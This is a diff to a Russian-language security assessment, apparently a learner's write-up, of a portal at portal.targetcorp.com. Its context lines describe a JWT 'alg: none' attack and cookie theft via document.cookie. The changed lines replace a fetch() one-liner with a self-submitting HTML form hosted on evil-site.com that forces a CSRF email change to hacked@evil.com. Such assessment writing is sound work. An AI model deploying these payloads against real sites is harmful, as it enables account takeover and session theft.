@@ -143,7 +143,10 @@ eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEwNSwidXNlcm5hbWUiOiJhdHRhY2tlciIsInJvbGUiOiJ1c2V
 Можно попробовать классическую JWT атаку `"alg": "none"`  если сервер не проверяет подпись можем изменить значение и попробовать отправить хотя у нас уже пользователь с админскими правами, + нет флага HTTPOnly что позволяет забрать Cookie через document.cookie
 Риск:
 Подмена сессии, повышении привилегий
-4 - в POST запросах отсутствует CSRF токен, я честно не до конца прошел еще эту тему, поэтому буду судить по тому что я читаю и знаю из собственного опыта, можно сказать что работает примерно так, сервер проверяет только куку если она валидна то меняет email, и тут уязвимость в том что сервер не знает сделал ли это пользователь или чужой сайт
+4 - в POST запросах отсутствует CSRF токен, я честно не до конца прошел еще эту тему, поэтому буду судить по тому что я читаю, можно сказать что работает примерно так, сервер проверяет только куку если она валидна то меняет email, и тут уязвимость в том что сервер не знает сделал ли это пользователь или чужой сайт
 Шаги эксплуатации:
-Скидываем пользователю сайта portal.targetcorp.com ссылку на https://evil-site.com там предварительно кладем такой js код: 
-fetch('https://portal.targetcorp.com/api/v1/account/change-email, {method: 'POST',credentials: 'include', headers: {'Content-Type': application/x-www-form-urlencoded}, body: 'new_email=hacked@evil.com' }');
+Скидываем пользователю сайта portal.targetcorp.com ссылку на https://evil-site.com там предварительно кладем такую страницу:
+```
+<html> <body> <form method="POST" action="https://portal.targetcorp.com/api/v1/account/change-email" enctype="application/x-www-form-urlencoded"> <input type="hidden" name="new_email" value="hacked@evil.com"> </form> <script>document.forms[0].submit()</script> </body> </html>
+```
+Как только пользователь открыл страницу то сразу отправится запрос на смену почты
